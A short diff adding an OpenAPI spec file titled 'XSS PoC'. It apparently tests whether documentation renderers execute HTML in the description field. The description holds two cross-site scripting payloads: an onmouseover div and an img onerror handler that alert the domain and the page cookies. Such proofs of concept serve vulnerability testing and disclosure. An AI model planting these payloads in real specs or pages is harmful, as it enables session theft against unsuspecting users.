@@ -1,0 +1,9 @@
+openapi: "3.0.0"
+info:
+  title: "XSS PoC"
+  version: "1.0.0"
+  description: |
+    <div onmouseover="alert('XSS by ' + document.domain)">
+      تحرك بالماوس هنا لاختبار الثغرة
+    </div>
+    <img src="x" onerror="alert(document.cookie)">
